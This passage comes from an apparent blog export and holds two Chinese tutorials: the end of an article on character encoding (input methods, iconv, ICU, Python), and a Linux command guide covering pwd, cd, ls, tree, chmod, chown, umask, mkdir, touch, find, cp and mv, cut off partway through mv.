这一步相当于输入法开了一个“草稿本”，专门记录你正在打的这段文字\n生成组合字符串\n输入法会将已输入的编码（如n → ni → nih → nihao）显示在屏幕上\n这段带虚线或高亮的临时文字被称为组合字符串，它不是应用程序缓冲区里的正式文本，而是由输入法通过IME接口直接绘制到光标位置上的\n在这个阶段，应用程序并不知道这些字母是什么 —— 它只知道光标处有一个正在编辑的输入会话\n步骤二：转换引擎 这是输入法最核心的部分，转换引擎根据缓冲区中的nihao，开始计算所有可能的候选结果\n转换引擎主要依赖两个东西 —— 词库和语言模型：\n1.词库\n存储大量词语及其拼音（或其他编码）对应关系的数据集合\n静态词库\n输入法出厂时内置的、包含数百万词条的巨大数据库。它定义了拼音与汉字、词语之间的基础对应关系\n动态/用户词库\n记录你个人常用词汇的词典。你输入过的名字、昵称、专业术语都会被添加进来，下次输入时就会优先显示\n云端词库\n现代输入法的“联网大脑”。它能实时从互联网上抓取最新的流行语、新闻热点、人名地名，让你的输入法永远“与时俱进”\n2.语言模型\n如果说词典是认字，那么语言模型就是理解语法和语境，它负责从众多同音词中，猜出你最想要的那一个\nN-gram 模型\n这是统计学模型，它通过分析海量文本数据，计算出词语组合的概率\n例如，它知道 P(好 | 你)（在“你”之后出现“好”的概率）要远远大于 P(耗 | 你)，因此，你好的排序会非常靠前\n更先进的模型（HMM, CRF, AI）\n现代输入法普遍采用更复杂的统计模型，甚至是深度学习神经网络（如 RNN/LSTM）\n这些模型不仅看前一个词，还会综合分析整个句子的结构和语义，从而做出惊人准确的预测\n例如，当你输入jintianwanshangwomenyiqiqu时，它能直接预测出 今天晚上我们一起去，而不是一堆不相关的单字\n步骤三：候选界面 生成列表\n转换引擎将计算出的结果，按照概率从高到低排序，生成一个候选列表\n渲染窗口\n输入法的界面模块（UI）获取这个列表，然后在屏幕上绘制出我们熟悉的候选窗口\n这个窗口是一个独立的、悬浮在所有应用之上的图层，由输入法完全控制\n步骤四：文本提交 用户选择\n用户通过按空格、数字键或鼠标点击，在候选窗口中选择了 你好\n发送指令\n输入法收到用户的选择后，会向操作系统的文本服务框架发送一个提交文本的指令\n内容交付\n这个指令里装的，就是最终确定的字符串 你好\n更底层地看，是这两个字符的Unicode 码点序列 (U+4F60, U+597D)\n应用接收\n应用程序的文本框接收到这个指令，就像接收到用户用剪贴板粘贴进来一段文本一样\n它将这两个字符插入到自己的文本缓冲区中\n最终渲染\n应用程序调用系统的字体渲染引擎，根据当前设置的字体，将U+4F60和U+597D对应的字形绘制到屏幕上\n至此，输入法绘制的临时草稿（带下划线的nihao和候选窗口）消失，你好这两个字被正式地写入了应用程序，整个输入流程完成\n编码转换工具和库 在处理来自不同年代、不同地区、不同系统的数据时，编码不一致是家常便饭：\n我们可能需要将一个使用GBK编码的旧网站数据库，迁移到新的、使用UTF-8的系统中\n用户可能会上传各种奇奇怪怪编码的文本文件，我们的程序需要有能力正确识别和处理它们\n我们调用的某个古老API接口，可能只接受GBK编码的请求\n因此，编码转换很重要\niconv iconv是一个乎所有类Unix系统都自带的跨平台命令行工具和编程库，专门用于字符编码的转换\n格式：\niconv -f \u0026lt;源编码\u0026gt; -t \u0026lt;目标编码\u0026gt; \u0026lt;输入文件\u0026gt; -o \u0026lt;输出文件\u0026gt; 常用参数：\n参数 作用说明 -f 或 \u0026ndash;from-code 指定输入文本的字符编码格式 -t 或 \u0026ndash;to-code 指定输出文本的字符编码格式 -l 或 \u0026ndash;list 列出支持的所有编码格式 -o 或 \u0026ndash;output 指定输出文件（否则输出到标准输出） -c 忽略非法输入字符（转换时跳过错误字符） \u0026ndash;verbose 显示详细的转换过程信息 eg：将一个GBK编码的文件转换为UTF-8编码的格式\niconv -f GBK -t UTF-8 gbk.txt -o utf8.txt ICU ICU（International Components for Unicode，Unicode国际组件）是一个由IBM（International Business Machines Corporation,国际商业机器公司）开发和维护的、功能极其强大的C/C++和Java库，后来交由了Unicode联盟管理\n其他语言也可以通过绑定或封装调用ICU库来使用大部分核心功能，但可能需要额外安装或配置\nICU不止是一个编码转换工具，还是一套全方位的国际化解决方案\n它提供比iconv更强大、更健壮的编码转换功能，支持超过200种编码，还有以下功能：\n字符归一化\n可以轻松地将字符串转换为NFC或NFD等范式\n排序\n它能实现真正符合语言习惯的排序\n例如，简单的按字节排序会将b 排在 á 前面，但ICU知道在西班牙语中它们应该如何正确排序\n对于中文，它可以实现按拼音、部首或笔画排序\n日期、时间、数字、货币格式化\n它可以根据不同国家/地区（Locale）的习惯，将同一个日期2025-08-13格式化为8/13/2025(美国)或 13/08/2025(英国)\n文本边界分析\n它能准确地识别出单词、句子、段落的边界，这对于文本处理和搜索引擎至关重要\n编程语言 现代主流编程语言都内置了强大的字符串和编码处理能力，通常足以应对日常的转换需求\n比如python内部使用unicode表示字符串，并提供了.encode()和.decode()方法，之前的示例中我们也使用过\neg1：将GBK字节流转换为unicode字符串\ngbk = b\u0026#39;\\xc4\\xe3\\xba\\xc3\u0026#39; # \u0026#34;你好\u0026#34; 的 GBK 字节 unicode= gbk.decode(\u0026#39;gbk\u0026#39;) eg2：接上一例，将unicode字符串编码为UTF-8字节流\nutf8 = unicode.encode(\u0026#39;utf-8\u0026#39;) Java, JavaScript, Go, Rust 等也都提供了类似的API，使得我们可以方便地在代码层面处理编码问题\n到这里，一切的一切也就结束了\n这篇文章诞生原因其实是在学linux命令的时候时常涉及字符、字等等东西，再加上以前看过不少相关文章视频，兴趣使然才写下了这些文字\n编码的世界远比我想象的复杂，本文也只是冰山一角、抛砖引玉之作，系统的学习还要综合网上的资料才行\n不管怎么样，希望能对你有所帮助\n","date":"2025-08-13T14:32:41+08:00","image":"http://picture.928330.xyz/typora/unicode-101-introduction.social.jpg","permalink":"https://blog.928330.xyz/p/%E4%B8%80%E6%96%87%E5%BC%84%E6%87%82%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E7%BC%96%E7%A0%81/","title":"一文弄懂字符集与编码"},{"content":"系统地学习linux命令 —— 这是我从接触linux以来就一直想要做的一件事，可是始终没有找到时间\n现在终于得闲了，嘻嘻\n我个人认为，与其单独地学习linux的知识点，不如从常见的命令开始，跟着命令一起学习\n而且依照知识点和命令循序渐进，对于初学者应该也比较容易接受\n于是就有了这篇文章\npwd —— 显示当前工作目录的完整路径 pwd全称是 print working directory，用于显示当前终端所在的工作目录的完整路径\n语法格式 pwd [参数] pwd命令通常不与路径参数一起使用，因为它总是显示当前所在的位置\nLinux工作目录 在Linux中，每个进程（包括正在使用的shell终端）都有一个当前工作目录，我们执行的所有相对路径命令都是基于这个目录的 路径分为物理路径和逻辑路径，物理路径是文件系统上不包含任何符 号链接的真实路径，逻辑路径则可能包含符号链接，pwd命令可以在这两种路径之间进行切换 常用参数 pwd的参数非常少，主要就是以下两个，用于处理符号链接的情况：\n参数 功能说明 -L 逻辑路径\n显示包含符号链接的路径，这是大多数shell中的默认行为。 -P 物理路径\n显示解析所有符号链接后的真实物理路径，不包含.或.. 使用示例 没有示例，这个很简单，自己用去吧\ncd —— 切换当前工作目录 cd全名change directory(改变目录)，其功能是切换用户当前所在工作目录\n语法格式 cd [参数] \u0026lt;目标路径\u0026gt; Linux路径与特殊目录 绝对路径：从根目录/开始的完整路径，例如/home/user/documents 相对路径：从当前工作目录开始的路径，不以/开头，例如../pictures 特殊目录快捷方式： ~：当前用户的主目录 -：上一次所在的目录 .：当前目录 ..：上一级目录 常用参数 参数 功能说明 -L 遵循逻辑路径\n如果要切换到的目录是一个符号链接，则进入该符号链接本身。这是默认行为 -P 遵循物理路径\n在切换目录前，解析所有的符号链接，直接进入其指向的真实物理目录 使用示例 使用绝对路径切换到系统日志目录\ncd /var/log 使用相对路径进入当前目录下的子目录\ncd dir 返回主目录，有两种方式\n不带任何参数：\ncd 或者使用~快捷方式：\ncd ~ 切换到上一级目录 —— 这是日常操作中使用频率非常高的命令\ncd .. 在当前目录和上一个目录之间切换\ncd - 切换到包含特殊字符的目录\ncd \u0026#34;My Documents\u0026#34; 如果目录名包含空格或其它特殊字符，需要用引号将其包裹起来\nls —— 显示目录中的文件及其属性信息 语法格式 ls [参数] \u0026lt;文件目录名\u0026gt; Linux的目录特点 linux文件或者目录名称最长可达256个字符\n以.开头的文件是隐藏文件，需要用-a参数才能显示\n.代表当前目录\n..代表上一级目录\nLinux匹配技法 使用命令对文件进行操作的时候，如果有很多文件需要处理，我们一个个去寻找、执行，那就太过耗时\n为了减少时间，我们可以使用正则，也能使用shell自带的匹配方式，下面就来介绍两种\n通配符与PATTERN Linux通配符是shell提供的一种字符模式匹配机制（PATTERN），常用于文件名匹配与路径匹配\n它属于通配符扩展机制，不是正则表达式，但语法上有些相似\n星号：* *可以匹配任意数量的任意字符（包括 0 个字符）\n匹配所有以 .txt 结尾的文件：\nls *.txt 匹配所有以 file 开头的文件：\nls file* 问号：? ?可以匹配任意一个字符\n匹配file1.txt、fileA.txt，但不匹配file10.txt：\nls file?.txt 中括号：[] 匹配[]内的任意一个字符或字符范围\n匹配 file1.txt、file2.txt、file3.txt：\nls file[123].txt 在[]中使用连字符-表示字符范围\n匹配 filea.txt 到 filez.txt 的所有单个字母文件：\nls file[a-z].txt 可加 ^ 或 ! 表示取反（排除匹配）\n匹配不包含小写字母的文件名：\nls file[!a-z].txt 大括号扩展 大括号扩展用于生成字符串序列，执行前由shell展开，并不会匹配文件名\n简单列举 格式：\n\u0026lt;前缀\u0026gt;{值1,值2,...}\u0026lt;后缀\u0026gt; eg：\necho file{A,B,C}.txt 展开为fileA.txt fileB.txt fileC.txt\n数字序列 格式：\n{起始..结束} eg：\necho file{1..5}.txt 展开为file1.txt file2.txt file3.txt file4.txt file5.txt\n字符序列 格式：\n{a..z} eg：\necho {a..d} 展开为a b c d\n带步进的序列 格式：\n{起始..结束..步长} eg：\necho {1..10..2} 展开为1 3 5 7 9\n嵌套大括号 多个括号组合使用，会展开所有组合方式\neg：\necho {A,B}{1,2} 展开为 A1 A2 B1 B2\n常用参数 内容显示 参数 功能说明 -a 显示所有文件及目录，包括.开头的隐藏目录 -A 不显示当前目录(.)和父目录(..) -R 递归显示所有子文件 -d 只显示目录本身，不列出目录内容 -i 显示文件的 inode 号码 -l 显示文件的详细信息，包含权限、所有者、大小、修改时间等 -h 与-l一起使用，以更易读的单位（如K, M, G）来显示文件大小 -s 显示文件占用的磁盘块数 -L 显示符号链接指向文件的详细信息 \u0026ndash;full-time 显示完整时间戳（精确到秒） 格式控制 参数 功能说明 -m 水平显示文件信息\n间隔符是逗号 -F 在文件名后附加一个字符以表示文件类型：\n/代表目录，*代表可执行文件，@代表符号链接 -p 在目录名的末尾加上一个斜杠/\n与-F类似但更简洁 -1 强制每行只显示一个文件\n没有-2，-3.. \u0026ndash;color=never/auto/always 为输出内容添加颜色以区分不同文件类型\nnever不显示，auto自动显示（默认），always强制使用 -C 按列显示\n默认行为，当输出不是终端时生效 -x 横向显示文件名\n按行排列 -N 显示文件名时不对特殊字符转义（显示原始文件名） \u0026ndash;group-directories-first 让目录显示在前，文件显示在后 \u0026ndash;time=WORD 指定使用哪种时间\nmtime/modification修改时间（默认）\natime/access/use访问时间\nctime/change状态改变时间\nbirth创建时间 排序方式 参数 功能说明 -t 按修改时间排序，最新的文件排在最前面 -S 按文件大小排序，最大的文件排在最前面 -r 将当前的排序结果反向排列 -X 按文件扩展名的字母顺序排序 -c 按文件状态改变时间排序（如权限变更时间） 排序方式 —— sort --sort=WORD可以指定排序方式\nWORD 排序方式说明 none 不排序，按目录项原始顺序显示（通常是创建顺序） name 按名称（文件名）排序（默认行为） extension 或 version 按文件扩展名排序 size 按文件大小排序（大文件在前） time 按默认时间（即--time=modification）排序 atime 或 access 或 use 按访问时间排序 ctime 或 status 按状态更改时间排序（如权限改变） birth 按创建时间排序（如果系统支持） 使用示例 显示/dev目录下所有以sd开头的文件列表（结合通配符）\nls /dev/sd* 依据文件内容大小进行排序，显示指定目录里的文件名以及详细信息（组合使用参数）\nls -Sl /etc 从这里也能看出，linux命令参数是不需要使用多个-的（-S -l），写在一起即可（-Sl）\ntree —— 以树状图格式显示目录内容 tree会以图形化的树状结构来显示文件和目录，比ls命令更直观、更清晰地展示目录的层次关系\n并非所有Linux发行版的最小化安装都自带此命令\n语法格式 tree [参数] [目录路径] 常用参数 核心功能 参数 功能说明 -d 只显示目录，不显示文件 -L \u0026lt;层级\u0026gt; 指定要显示的目录层级深度\n例如，-L 2表示最多显示到第二层目录 -f 显示每个文件或目录的完整路径前缀 -a 显示所有文件，包括以.开头的隐藏文件 格式控制 参数 功能说明 -h 以人类可读的格式（如 K, M, G）显示文件大小 -p 显示文件和目录的权限 -u 显示文件或目录的所有者 -g 显示文件或目录的所属组 \u0026ndash;du 显示每个目录包含内容的总大小 内容筛选 参数 功能说明 -P PATTERN 只显示匹配PATTERN通配符模式的文件和目录 -I PATTERN 不显示匹配PATTERN通-符模式的文件和目录 使用示例 展示/etc目录下两层内的目录结构\ntree -d -L 2 /etc 只显示当前目录结构中所有以.c或.h结尾的文件\ntree -P \u0026#34;*.c|*.h\u0026#34; 目录本身还是会显示出来，只是不再显示具体的文件，以便维持树状结构\n显示当前目录的结构，但排除bak和none这两个目录\ntree -I \u0026#34;bak|none\u0026#34; chmod —— 更改文件或目录的访问权限 chmod全称是change mode(改变模式)，其功能是更改文件或目录的访问权限，决定了哪些用户可以对它们进行读、写、执行等操作\n语法格式 数字模式 chmod [参数] \u0026lt;八进制权限码\u0026gt; \u0026lt;文件名\u0026gt;/\u0026lt;目录名\u0026gt; 符号模式 chmod [参数] [who][operator][permission] \u0026lt;文件名\u0026gt;/\u0026lt;目录名\u0026gt; Linux文件权限模型 Linux中的文件和目录权限使用三种基本权限 (Permission)：\nr: read (读权限) w: write (写权限) x: execute (执行权限) 对文件而言： 是否能运行这个文件 对目录而言：是否可以进入该目录（cd）或使用该路径（ln） 而这三个权限分别对应着八进制数值：\n读（r） = 4 写（w） = 2 执行（x） = 1 通过将这些权限数值相加，可以组合出不同的权限（-表示没有对应权限），比如：\n数字 权限组合 含义 7 4+2+1 = rwx 可读、可写、可执行 6 4+2 = rw- 可读、可写 5 4+1 = r-x 可读、可执行 4 4 = r\u0026ndash; 只读 0 0 = \u0026mdash; 没有权限 Linux中权限分配给三类用户 (Who)：\nu: user (文件所有者) g: group (文件所属组) o: others (其他人) 除此之外还有一个表示三类用户集合的标志：\na: all (所有人, u, g, o的合集) u、g、o分别对应三个八进制权限码数值，利用三位数字组合我们就能表示出三类用户的权限，例如权限值 755 就表示：\n用户权限：7（rwx） 组权限：5（r-x） 其他权限：5（r-x） 常见权限对应关系如下：\n权限值 符号形式 含义 777 rwxrwxrwx 所有人可读写执行（不安全） 755 rwxr-xr-x 用户有全部权限，其他用户只能读执行 700 rwx\u0026mdash;\u0026mdash; 仅用户本人拥有权限 644 rw-r\u0026ndash;r\u0026ndash; 用户可读写，其他用户只读 600 rw\u0026mdash;\u0026mdash;- 仅用户本人可读写（常用于私密文件） 可以使用之前学过的ls -l命令查看权限，例如：\ndrwxr-xr-x 2 user group 4096 Jul 29 10:00 mydir 其中的rwxr-xr-x就是755\n符号模式 这是chmod最直观易读的用法，它通过明确的符号来增、删或设定权限\n符号模式的命令由三部分构成（各部分之间没有空格，下面加空格是为了方便观看）：\n[who] [operator] [permission] who (作用对象)：指定要为哪类用户更改权限 u: user/所有者 g: group/所属组 o: others/其他人 a: all/所有人（如果省略who，则默认为a） operator (操作符)：指定要执行的操作 +: 添加指定的权限 -: 移除指定的权限 =: 覆盖原有的权限，只给予指定的权限 permission (权限)：指定r, w, x中的一种或多种 将这三部分组合起来，就可以精确地调整权限\n可以同时进行多个组合，用逗号,隔开\n常用参数 命令行选项 参数 功能说明 -R 递归地更改目录及其下所有文件和子目录的权限 -v 显示详细过程，显示每个文件权限的更改情况 -c 只在权限确实发生更改时才显示报告 \u0026ndash;reference=\u0026lt;参考文件\u0026gt; 将权限设置成参考文件的权限 使用示例 数字模式 这是最常用的设置权限的方法，但是需要一些记忆\n为脚本添加执行权限\nchmod 755 my_script.sh 这是常见用法之一，755权限(rwxr-xr-x)意味着：所有者可以读、写、执行；所属组和其他人可以读和执行，这使得脚本可以被所有者修改，被所有人执行\n设置一个私密文件\nchmod 600 private_key.pem 600权限(rw-------)意味着只有文件所有者可以读写该文件，其他人没有任何权限\n将/var/www/html目录以及其下所有文件和子目录的权限都设置为755（目录）或644（文件）\nchmod -R 755 /var/www/html 符号模式 这种模式在不希望重新计算整个三位数字，只想微调某个权限时非常有用，很方便\n为所有用户添加执行权限\nchmod a+x file 与chmod 755一样，常见于设置脚本权限\n为所属组和其他人移除写权限\nchmod go-w file 为文件所有者设置固定的读写权限\nchmod u=rw file 其他 把new.txt文件权限修改成和old.txt一样\nchmod --reference=old.txt new.txt chgrp \u0026amp; chown —— 更改文件或目录的所有者和所属组 chgrp名称来源于 “change group”，专门用于更改文件或目录的所属组\nchown名称来源于 “change owner”，它更加强大，也更加常用，因为它既可以更改文件或目录的所有者，也可以同时更改所属组\n语法格式 chown chown [参数] \u0026lt;新所有者\u0026gt;[:\u0026lt;新所属组\u0026gt;] \u0026lt;文件\u0026gt;/\u0026lt;目录\u0026gt; chgrp chgrp [参数] \u0026lt;新所属组\u0026gt; \u0026lt;文件\u0026gt;/\u0026lt;目录\u0026gt; Linux所有者与所属组 在Linux中，每个文件和目录都有一个所有者（Owner）和一个所属组（Group），所有者通常是创建该文件的用户，而所属组允许多个用户共享对文件的访问权限，一个用户可以属于多个组\n更改所有权通常需要管理员权限（sudo）\n用户名称和组名称在系统里是分开的：\n用户名存储在/etc/passwd文件\n组名存储在/etc/group文件\n因此，我们可以创建一个用户名叫alice，也可以有一个组名叫alice，它们是不同的实体，不冲突\n常用参数 这两个命令的大部分核心参数是通用的，只有--from例外，是chown独有\n参数 功能说明 -R 递归地更改目录及其子目录下所有文件和目录的所有权 -v 显示详细过程，为每个被处理的文件打印一条所有权变更的消息 -c 只在所有权确实发生改变时才显示详细过程 \u0026ndash;from=\u0026lt;当前归属\u0026gt; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-(chown独有)\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; 仅当文件的当前所有者和/或组匹配指定值时，才更改其所有权 \u0026ndash;reference=\u0026lt;参考文件\u0026gt; 使用参考文件的所有者和所属组来设置目标文件，而不是自己指定 使用示例 将file.txt的所有者更改为用户alice\nsudo chown alice file.txt 更改文件的所属组\n使用chgrp：\nsudo chgrp newgroup file.txt 使用chmod：\nsudo chown :newgroup file.txt 将file.txt的所有者设置为newuser，所属组设置为newgroup\nsudo chown newuser:newgroup file.txt 将目录/var/www/html及其下所有文件和子目录的所有者和所属组都设置为名为www-data的用户和组\nsudo chown -R www-data:www-data /var/www/html www-data是Linux中常用的Web服务器（比如 Apache、Nginx）运行的用户和组\nmkdir —— 创建目录文件 语法格式 mkdir [参数] \u0026lt;目录名1\u0026gt; \u0026lt;目录名2\u0026gt;... Linux的umask权限控制 在Linux中，每个新创建的目录或文件都会根据当前的umask值决定其默认权限\numask是权限掩码，它会从默认的最大权限中\u0026quot;减去\u0026quot;（实际不是减法）指定的值，结果就是新建文件或目录的默认权限：\n默认权限 = 最大权限 - umask umask有四位，通常我们设置umask只关注后三位（用户、组、其他），第一位用于以下特殊权限控制：\n权限位 名称 作用 4 setuid 文件以创建者身份运行（对文件） 2 setgid 组权限继承（对目录） 1 sticky 只有文件所有者可删除（对目录） 但在大多数实际中，umask的第一位几乎都是 0\n因为我们通常不通过umask控制特殊权限，而是用chmod +s、+t显式设置\n对于目录，最大默认权限是 777；对于文件，最大默认权限是 666（因为默认不为新文件设置执行权限）\n例如：\numask 为 0022 新建目录的权限为 777 - 022 = 755 新建文件的权限为 666 - 022 = 644 可以使用umask命令查看当前掩码，也可以使用umask新值来设置，例如：\numask 0027 这将修改新建目录权限为750（777-027），文件权限为640（666-027）\n这里需要解释一个误区：umask其实不是减法，而是按位操作，先对umask取反后与运算：\n默认权限 = 最大权限 \u0026amp; (~umask) 比如上面的umask 0027，文件权限为 640（666-027），你会发现6-7不等于0，但按位计算就是对的\n我们使用二进制表示，分别计算每一位：\n类别 默认权限 (666) umask (0027) ~umask (按位取反) 实际权限（按位与） 所有者 110 000 111 110 （rw-） 所属组 110 010 101 100 （r\u0026ndash;） 其他人 110 111 000 000 （\u0026mdash;） 合起来就是640，即rw-r-----\n常用参数 核心功能 参数 功能说明 -p 递归创建\n当需要创建的目录，其父目录尚不存在时，这个参数会自动创建所有不存在的父目录\u0026lt;br / -v 显示详细过程\n每创建一个新目录，都会打印一条消息。 权限控制 参数 功能说明 -m 设置权限\n在创建目录的同时，直接为其设定权限（例如-m 755），忽略系统的umask默认值 使用示例 在当前位置一次性创建多个目录\nmkdir docs images scripts 创建多级目录，并显示创建过程\nmkdir -pv dir1/dir2/dir3/ 创建一个权限为777的目录\nmkdir -m 777 dir touch —— 创建空文件/更新文件的时间戳 touch有两个主要功能：\n如果文件不存在，则创建一个新的空文件\n如果文件已存在，则更新该文件的访问和修改时间戳为当前时间\n语法格式 touch [参数] \u0026lt;文件名\u0026gt; Linux文件时间戳 Linux系统为每个文件维护的三个主要时间戳：\n访问时间 (atime): 最后一次访问（读取）文件内容的时间。 修改时间 (mtime): 最后一次修改文件内容的时间。这是我们用ls -l默认看到的时间 更改时间 (ctime): 最后一次更改文件元数据（metadata，如权限、所有者）或内容的时间 touch命令的主要作用就是更新这些时间戳，特别是atime和mtime\n常用参数 参数 功能说明 -a 只更改文件的访问时间（atime） -m 只更改文件的修改时间（mtime） -c 如果文件不存在，不创建新文件 -r \u0026lt;文件\u0026gt; 使用另一个文件的时间戳来更新目标文件，而不是使用当前时间 -d \u0026lt;日期字符串\u0026gt; 使用指定的日期字符串\u0026quot;YYYY-MM-DD HH:MM:SS\u0026quot;来更新时间戳 -t \u0026lt;时间戳\u0026gt; 使用指定的[CC]YYMMDDhhmm[.ss]格式的时间戳来更新 使用示例 创建多个空文件\ntouch read.md file.txt note.log 更新一个已存在文件的时间戳\ntouch file.txt 将new.txt的时间戳设置得和old.txt完全一样\ntouch -r old.txt new.txt 如果new.txt不存在，touch会创建new.txt文件，并将其时间戳设置为old.txt的时间戳\n创建一个指定日期的文件\ntouch -d \u0026#34;2023-01-01 12:30:00\u0026#34; time.txt 创建一个指定时间戳的文件\ntouch -t 202508011030.45 time.txt find —— 在目录中搜索文件 find会递归地遍历指定的目录树，根据用户设定的条件来查找文件，并能对查找到的文件执行指定的操作\n语法格式 find \u0026lt;起始路径\u0026gt; \u0026lt;表达式\u0026gt; / | \\ \u0026lt;选项\u0026gt; \u0026lt;测试\u0026gt; \u0026lt;动作\u0026gt; find命令的核心：表达式引擎 与其他命令使用简单参数不同，find命令的核心是一系列可以组合的表达式：\n\u0026lt;选项\u0026gt; \u0026lt;条件\u0026gt; \u0026lt;动作\u0026gt; 测试（选项+条件）：用来判断文件是否符合某个条件，例如按名称或大小匹配，如果符合，测试返回真 动作：指定对找到的文件执行什么操作，最常见的动作是打印路径、执行命令 操作符：用于组合多个测试，例如-and(与),-or(或),-not(非) 整个find命令就是构建一个逻辑表达式，find会用这个表达式去测试路径下的每一个文件\n常用参数 按名称/路径测试 参数 功能说明 -name /PATTERN/ 按文件名匹配（区分大小写），支持通配符*和? -iname /PATTERN/ 按文件名匹配（不区分大小写） -path /PATTERN/ 按完整路径（包含目录名和文件名）进行匹配 -regex /PATTERN/ 使用正则表达式匹配完整路径 按类型/大小/时间测试 参数 功能说明 -type TYPE 按文件类型查找\nf代表普通文件，d代表目录，l代表符号链接 -size N[cwbkMG] 按文件大小查找\nN是数字，+N表示大于N，-N表示小于N，N表示等于N\nN的单位：c(字节)，w(字,2字节)，b(块,512字节)，k(KB)，M(MB)，G(GB) -mtime N 按修改时间查找\nN代表天数+N表示超过N天前修改，-N表示N天内修改，N表示正好第N天前修改 -ctime N 按状态改变时间查找\n类似-mtime，针对权限、所有者等属性变化时间 -atime N 按访问时间查找\n类似-mtime，针对最后访问时间 -user NAME 按文件所有者查找 -group NAME 按文件所属组查找 -perm MODE 按文件权限查找\n支持数字（如0755）或符号模式（如u=rwx,g=rx,o=rx）\nMODE表示权限正好等于，-MODE表示完全包含，/MODE表示任意一位包含 对结果执行的动作 参数 功能说明 -print 打印出匹配文件的完整路径\n这是find的默认动作，通常可以省略 -ls 对匹配的文件执行ls -lids命令，显示详细信息 -delete 删除找到的文件 -exec COMMAND {} ; 对每个找到的文件执行指定的COMMAND命令\n{}会被替换为当前文件名，\\;表示命令结束，必须转义！ -ok COMMAND {} ; 与-exec类似，但在执行每个命令前会进行交互式确认 -prune 跳过指定目录，不进入递归查找\n常用：find \u0026lt;起始目录\u0026gt; -path \u0026quot;\u0026lt;要排除的路径\u0026gt;\u0026quot; -prune -o \u0026lt;其他查找条件\u0026gt; \u0026lt;动作\u0026gt;\n如果要排除多个目录，可以写多个 -path ... -prune 条件组合 逻辑操作符 操作符 完整形式 功能说明 -a -and 逻辑与（默认行为，可省略）表示两个条件都满足 -o -or 逻辑或，表示只要满足任一条件即可 ! -not 逻辑非，取反，表示不满足某个条件 () 无 组合多个条件表达式，用于改变默认的优先级，括号需加转义：\\( 和 \\) 使用示例 在/log目录下，查找所有类型为普通文件且大小超过10MB的文件，并列出详细信息\nfind /log -type f -size +10MB -ls 查找/etc目录下，最近7天内被修改过的所有文件\nfind /etc -mtime -7 查找/home下所有所有属于用户alice的，且权限为777的文件\nfind /home -type f -user alice -perm 777 在当前目录及其所有子目录下，查找所有以.log结尾的文件，并移动到/log中\nfind . -name \u0026#34;*.log\u0026#34; -exec mv -n {} /log/ \\; 找出所有包含了“main”这个词的C语言源文件\nfind . -type f -name \u0026#34;*.c\u0026#34; -exec grep -l \u0026#34;main\u0026#34; {} \\; 在/home下查找所有.txt和.png文件，但跳过其中的/log和/mod子目录，并打印出完整路径\nfind /home \\( -path \u0026#34;./log\u0026#34; -o -path \u0026#34;./mod\u0026#34; \\) -prune -o \\( -name \u0026#34;*.txt\u0026#34; -o -name \u0026#34;*.png\u0026#34; \\) -print \\( -path \u0026quot;./log\u0026quot; -o -path \u0026quot;./mod\u0026quot; \\) -prune：排除这两个目录 -o：如果不是被剪枝的目录，则继续执行下一部分 \\( -name \u0026quot;*.txt\u0026quot; -o -name \u0026quot;*.png\u0026quot; \\)：查找 txt 或 png 文件 -print：打印完整路径 最好使用括号包裹过滤和查找的条件，否则无法保证结果\ncp —— 复制文件/目录 语法格式 cp [参数] \u0026lt;源文件1\u0026gt; \u0026lt;源文件2\u0026gt;... \u0026lt;目标文件名\u0026gt; Linux文件属性 cp命令的很多参数都与文件属性相关，这些我们在上文大多都提到过：\n每个文件和目录都有其所有者和所属组 每个文件都有读（r）、写（w）、执行（x）的权限 这些权限分别针对\u0026quot;所有者\u0026quot;、\u0026ldquo;所属组\u0026rdquo;、\u0026ldquo;其他人\u0026rdquo; 每个文件都有多个时间戳，最常用的是最后修改时间 常用参数 核心功能 参数 功能说明 -r, -R 递归复制\n这是复制目录时必须使用的参数，它会复制该目录下所有的文件和子目录\n最好使用-R，它是更标准化的写法 -i 交互模式\n在覆盖一个已存在的文件前，会先进行提示并要求用户确认 -n 不覆盖已存在的文件\n如果在目标位置有同名文件，则跳过该文件的复制 -u 更新复制\n仅当源文件比目标文件新，或者目标文件不存在时，才执行复制操作 -v 显示详细过程\n列出每个正在被复制的文件名 -p 保留文件属性\n复制时，使新文件保留源文件的权限、所有者、时间戳等属性 链接 参数 功能说明 -d 保留符号链接\n当复制一个符号链接（软链接）时，直接复制链接本身，而不是它所指向的文件 -l 创建硬链接，而不是复制文件内容 -s 创建符号链接，而不是复制文件内容 -a 归档模式\n这是一个强大的组合参数，通常等效于-dR --preserve=all (在某些系统中是-pPR)\n它表示递归复制、保留链接、并保留所有文件属性，常用于备份 强制 参数 功能说明 -f 强制\n如果目标文件已存在且无法打开进行写入，cp会先尝试将其删除，然后再复制 备份 参数 功能说明 --backup[=CONTROL]\n或-b[=CONTROL] 为每个已存在的目标文件创建一个备份 这个和-a参数不同，是用来备份目标位置同名文件的，防止误覆盖\nCONTROL可选值：\n值 说明 none 不进行备份（与不加--backup等效） numbered 使用编号方式备份文件，如：file~, file.~1~, file.~2~ 等 existing 如果之前使用的是numbered，则继续编号；否则使用 simple（见下） simple 简单备份，文件名加一个 ~ 号，如：file~ 如果省略=CONTROL，则使用默认的备份方式，通常是existing\n使用示例 递归复制整个文件夹到指定目录下，如果目标已存在则提示是否覆盖\ncp -Ri dir1/ dir2/ 复制文件到/etc目录下，覆盖已有文件不再询问\ncp -f file /etc 递归复制文件夹的内容到指定目录下，保留所有属性，只更新变动过的文件，并显示过程\ncp -auv dir1/. dir2/ 注意这里使用的是dir1/.而不是dir1/，区别在于前者不包括目录dir1本身，只包括其中内容\n结合{}，把file1复制为file1.bak\ncp file1{,.bak} 这里的命令展开就是cp file1 file1.bak，是一个非常巧妙的缩写方法\nmv —— 移动/重命名文件 语法格式 mv [参数] \u0026lt;源文件或目录\u0026gt; mv的工作原理 mv行为根据操作是否在同一个文件系统内而有所不同\n在同一个文件系统内移动 此操作几乎是瞬时完成的\nmv并不会真的移动磁盘上的数据，它只是修改了文件的路径记录（inode中的指针），所以速度极快\n在不同的文件系统间移动 这个过程的速度取决于文件的大小\n例如从本地硬盘移动到U盘，此时mv无法只修改路径记录，它会执行一个完整的复制操作，将文件内容从源位置复制到目标位置，然后在确认复制成功后删除原始文件，实际上相当于先执行cp再执行rm\n其实类似windows在不同盘符之间移动文件\n常用参数 核心功能 参数 功能说明 -i 